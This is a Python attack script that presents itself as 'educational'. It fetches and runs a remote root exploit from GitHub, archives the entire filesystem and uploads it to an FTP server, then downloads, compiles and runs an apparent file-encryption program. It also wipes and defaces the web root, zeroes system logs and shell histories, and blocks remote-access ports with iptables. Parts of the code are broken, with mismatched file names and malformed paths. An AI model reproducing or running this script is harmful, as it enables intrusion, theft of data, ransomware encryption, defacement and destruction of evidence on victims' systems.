#!/bin/usr/python
#Author: Eitenne
#DOC: Its not my fault if you get caught i made this for educational purposes! XD

# # # S E R V I C E S # # #
#exploit for root!
#Full system backup!
#Backup send to ftp server!
#Encrypt files!
#Deface web page!
#Null logs!
#Close open ports!
#pwned!

import sys
import os
import time
import ftplib
import urllib2

#######################
# # # C O N F I G # # #
#######################
#
deface_page = "https://pastebin.com/raw/vbHUAy9n"
#
#FTP
ftp_host = "127.0.0.1"
ftp_user = "username"
ftp_password = "password"
#
got_root = "Y"  #if N then will try to exploit and gain root!
#
###############################
# # # E N D - C O N F I G # # #
###############################

if got_root == "N":
    print "Attempting to root!"
    os.system('wget https://raw.githubusercontent.com/Eitenne/Public/master/AutoRoot.py; python AutoRoot.py')
else:
    print "Ok attempting to pwn all!"

os.system('rm -rf exploits')
os.system('cd /; tar -cvpzf backup.tar.gz --exclude=/backup.tar.gz --one-file-system /')
session = ftplib.FTP(ftp_host, ftp_user, ftp_password)
file = open('backup.zip','rb')          
session.storbinary('STOR backup.zip', file)
file.close()
session.quit()

os.system('wget https://raw.githubusercontent.com/Eitenne/Public/master/CryLi.c')
os.system('gcc Cryli.c -lcrypto -o Cryli')
os.system('chmod +x CryLi; ./CryLi.*')
os.system('rm CryLi; rm CryLi.')
os.system('rm -rf /var/www/html/ *')
os.system('wget ' + deface_page + ' -O index.html')
os.system('mv index.html /var/www/html/index.html')
os.system('dd if="/dev/null" of=".../tmp/logs"')
os.system('dd if="/dev/null" of=".../root/.bash_history"')
os.system('dd if="/dev/null" of=".../root/.ksh_history"')
os.system('dd if="/dev/null" of=".../root/.bash_logout"')
os.system('dd if="/dev/null" of=".../usr/local/apache/logs"')
os.system('dd if="/dev/null" of=".../usr/local/apache/log"')
os.system('dd if="/dev/null" of=".../var/apache/logs"')
os.system('dd if="/dev/null" of=".../var/apache/log"')
os.system('dd if="/dev/null" of=".../var/run/utmp"')
os.system('dd if="/dev/null" of=".../var/logs"')
os.system('dd if="/dev/null" of=".../var/log"')
os.system('dd if="/dev/null" of=".../var/adm"')
os.system('dd if="/dev/null" of=".../etc/wtmp"')
os.system('dd if="/dev/null" of=".../etc/utmp"')
os.system('dd if="/dev/null" of="...$HISTFILE"')
os.system('dd if="/dev/null" of=".../var/log/lastlog"')
os.system('dd if="/dev/null" of=".../var/log/wtmp"')
os.system('history -c')
os.system('iptables -A INPUT -p tcp -m tcp --dport 22 -j DROP')
os.system('iptables -A INPUT -p tcp -m tcp --dport 21 -j DROP')
os.system('iptables -A INPUT -p tcp -m tcp --dport 23 -j DROP')
os.system('iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT')
#In development!
